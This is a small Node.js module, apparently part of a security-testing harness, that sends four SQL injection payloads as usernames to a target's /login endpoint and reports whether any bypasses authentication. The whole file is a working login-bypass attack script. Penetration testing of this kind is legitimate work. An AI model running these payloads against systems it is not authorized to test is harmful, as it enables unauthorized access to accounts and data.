const axios = require('axios');

const PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin' --",
  "' UNION SELECT 1,'x','y'--",
];

async function runSqliAttack({ baseUrl }) {
  const start = Date.now();
  const evidenceLines = [];

  for (const payload of PAYLOADS) {
    try {
      const res = await axios.post(
        `${baseUrl}/login`,
        { username: payload, password: 'x' },
        { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
      );

      if (res.data && res.data.success === true) {
        return {
          vulnerability: 'sqli',
          exploited: true,
          payload,
          evidence: `Payload "${payload}" returned success:true without valid credentials`,
          durationMs: Date.now() - start,
        };
      }

      evidenceLines.push(`Payload "${payload}": success=false`);
    } catch (err) {
      const status = err.response ? err.response.status : 'network_error';
      const msg = err.response ? err.response.data.error || '' : err.message;
      evidenceLines.push(`Payload "${payload}": ${status} — ${msg}`);
    }
  }

  return {
    vulnerability: 'sqli',
    exploited: false,
    payload: null,
    evidence: `All ${PAYLOADS.length} payloads were rejected. ${evidenceLines.join('; ')}`,
    durationMs: Date.now() - start,
  };
}

module.exports = { runSqliAttack };
